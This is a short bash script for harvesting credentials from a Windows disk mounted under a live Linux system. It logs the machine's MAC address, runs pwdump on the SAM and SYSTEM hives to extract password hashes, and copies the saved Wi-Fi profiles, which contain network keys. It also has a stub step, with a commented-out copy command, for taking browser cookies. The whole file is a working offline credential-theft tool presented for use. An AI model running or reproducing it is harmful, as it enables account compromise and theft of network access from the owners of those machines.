#!/usr/bin/env bash
home=$(pwd)
cd data
lognumber=$(ls | wc -l)
#mkdir if dir doesnt exist
mkdir -p ${lognumber}
cd ..
store=${home}"/data/${lognumber}"
hashfile="${store}/log.txt"

echo "Don't forget to mount the hard drive. "
echo "**In updated Windows versions, hashes are likely null.**"
echo " "
echo "###Getting System Info###"
echo "Label (arg1): ${1}" >> ${hashfile}
echo "##############" >> ${hashfile}
macchanger -s wlan0 | grep "Permanent" >> ${hashfile}
echo "##############" >> ${hashfile}
cd /media/root/OS/Windows/System32/config
pwdump SYSTEM SAM >> ${hashfile}
echo "##############" >> ${hashfile}
cd $home
echo "ok"

echo " "
echo "###Copying Wi-Fi Profiles###"
cp -R /media/root/OS/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces $store"/wifi/"
echo "ok"

echo " "
echo "###Filling Cookie Jar###"
echo "failed"

echo " "
echo "DONE"
#cp -R cookie files into "${store}/cookiejar/"


